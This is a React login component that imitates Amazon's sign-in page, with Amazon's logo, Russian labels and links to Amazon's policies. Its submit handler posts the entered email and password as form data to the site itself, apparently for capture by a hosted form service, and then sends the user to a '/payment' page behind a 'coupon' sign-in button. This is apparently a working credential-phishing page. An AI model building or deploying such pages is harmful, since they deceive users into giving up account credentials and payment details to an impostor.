import { useContext } from "react";
import { Link, useHistory } from "react-router-dom";
import { Formik, Field, Form } from "formik";
import { LoginContext } from "../App";

import Logo from '../images/amazon_logo_black.svg';

export default function Login() {
  const { setLogin } = useContext(LoginContext)
  const history = useHistory();

  function validateEmail(value) {
    let error;
    if (!value) {
      error = '*Required';
    } else if (!/^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}$/i.test(value)) {
      error = '*Invalid email address';
    }
    return error;
  }
  
  function validatePassword(value) {
    let error = "";
    const passwordRegex = /(?=.*[0-9])/;
    if (!value) {
      error = "*Required";
    } else if (value.length < 8) {
      error = "*Password must be 8 characters long.";
    } else if (value.length > 30) {
      error = "*Password must be less 30 characters long.";
    } else if (!passwordRegex.test(value)) {
      error = "*Invalid password. Must contain one number.";
    }
    return error;
  };

  const handleSubmit = (e) => {
    e.preventDefault()
    let formData = new FormData(e.target.closest('form'))
    fetch('/', {
      method: 'POST',
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams(formData).toString()
    })
    .then(() => {
      history.push('/payment')
      setLogin('true')
    })
    .catch(error => console.log(error))
  }

  return (
    <main>
      <div className="login__page">
        <Link to='/' className='login__home'>
          <img src={Logo} alt="" />
        </Link>
        <Formik
          initialValues={{ isInitialValid: false, email: "", password: "" }}
        >
          {({errors, touched, isValid, dirty}) => (
            <Form
              className='login__form'
              name="login"
              method="post"
              onSubmit={handleSubmit}
            >
              <h2>Вход</h2>

              <Field type="hidden" name="form-name" value="login" />

              <label htmlFor="email">Электронный адрес</label>
              <Field id='email' name="email" type="email" autoComplete="off" validate={validateEmail} />
              {errors.email && touched.email && <div>{errors.email}</div>}

              <label htmlFor="password">Пароль</label>
              <Field id='password' name="password" type="password" validate={validatePassword} />
              {errors.password && touched.password && <div>{errors.password}</div>}

              <button className='coupon__signin' type="submit" disabled={!(isValid && dirty)}>Продолжить</button>

              <div className="policy">
                Продолжая, вы соглашаетесь с<br/>
                <a href='https://www.amazon.com/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&nodeId=508088'>
                  правилами пользования
                </a> и&nbsp;
                <a href='https://www.amazon.com/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&nodeId=468496'>
                  политикой конфиденциальности
                </a>
                &nbsp;amazon.com
              </div>
            </Form>
          )}
        </Formik> 
      </div>
    </main>
  )
}